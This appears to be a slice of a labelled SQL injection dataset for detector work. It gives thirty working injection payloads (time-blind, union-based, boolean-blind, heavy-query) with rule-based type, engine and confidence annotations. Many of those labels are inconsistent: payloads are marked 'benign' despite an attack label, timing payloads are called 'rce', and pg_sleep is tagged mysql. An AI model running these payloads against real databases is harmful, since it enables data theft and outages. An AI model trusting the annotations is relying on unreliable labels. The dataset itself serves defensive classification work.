row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
4860,"1%"" ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4861,1' ) and sleep ( 5 ) and ( 'xecl' like 'xecl,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
4862,"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) # irvm",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
4863,"1 ) as ooex where 1087 = 1087 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,,boolean_blind,generic,0.95,1087 = 1087 or detected — boolean_blind injection (priority 8) on generic,rule-based
4864,end and ( ( 'vcaf' like 'vcaf,1,,boolean_blind,generic,0.95,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
4865,"1%"" or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
4866,"1"" ) ) as esho where 8864 = 8864 order by 1--",1,,boolean_blind,generic,0.95,8864 = 8864 or detected — boolean_blind injection (priority 8) on generic,rule-based
4867,"-4280%"" ) ) ) union all select 7981,7981--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4868,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) +'",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
4869,1'+ ( select 'fqkk' where 9725 = 9725,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4870,"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
4871,"1"" ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4872,"-1072%"" ) ) or 3090 = 3539",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4873,"-9574' ) as rxym where 4719 = 4719 union all select 4719,4719,4719,4719,4719,4719,4719--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4874,"-8833' ) ) union all select 3227,3227,3227,3227,3227--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4875,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'cysu' like 'cysu",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
4876,"1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'zfrs' = 'zfrs",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
4877,1' ) and sleep ( 5 ) and ( 'orxt' = 'orxt,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
4878,end and ( ( ( 3673 = 3673,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4879,"-4637"" where 8354 = 8354 or 1186 = 2714--",1,,boolean_blind,generic,0.95,8354 = 8354 or detected — boolean_blind injection (priority 8) on generic,rule-based
4880,end# ckxq,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
4881,1'+ ( select ejaj where 1651 = 1651 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) +',1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
4882,"-9558"" ) ) ) union all select 2935,2935,2935,2935,2935--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4883,"1' ) union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4884,"1%' ) ) union all select null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4885,"1"" ) ) as vtad where 3653 = 3653 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,,rce,generic,0.95,0x4b774c75 detected — rce injection (priority 1) on generic,rule-based
4886,1'|| ( select 'mobv' from dual where 6338 = 6338,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4887,"-2964"" ) ) order by 1--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4888,"-9208%"" ) ) or 8571 = 8571--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4889,"1"" ) ) as drss where 2077 = 2077 and 7533 = 7533--",1,,boolean_blind,generic,0.95,2077 = 2077 and detected — boolean_blind injection (priority 8) on generic,rule-based
